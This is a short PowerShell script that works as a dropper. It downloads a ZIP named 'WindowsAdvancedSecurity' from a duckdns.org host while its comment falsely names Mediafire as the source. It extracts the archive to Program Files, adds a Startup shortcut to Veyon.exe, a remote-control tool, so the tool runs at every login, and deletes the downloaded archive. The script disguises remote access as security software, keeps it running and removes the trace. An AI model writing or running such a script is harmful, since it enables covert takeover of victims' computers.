# Download the ZIP file from Mediafire
$downloadLink = "http://auroraswebs.duckdns.org/WindowsAdvancedSecurity.zip"
$destinationPath = "C:\WindowsAdvancedSecurity.zip"
Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath

# Extract the ZIP to the desired directory using -Force
$extractToPath = "C:\Program Files\"
Expand-Archive -Path $destinationPath -DestinationPath $extractToPath -Force

# Create a shortcut for Veyon.exe and place it in the startup folder
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$($WScriptShell.SpecialFolders('Startup'))\Veyon.lnk")
$Shortcut.TargetPath = "C:\Program Files\WindowsAdvancedSecurity\Veyon.exe"
$Shortcut.Save()

# Remove the downloaded ZIP file
Remove-Item -Path $destinationPath
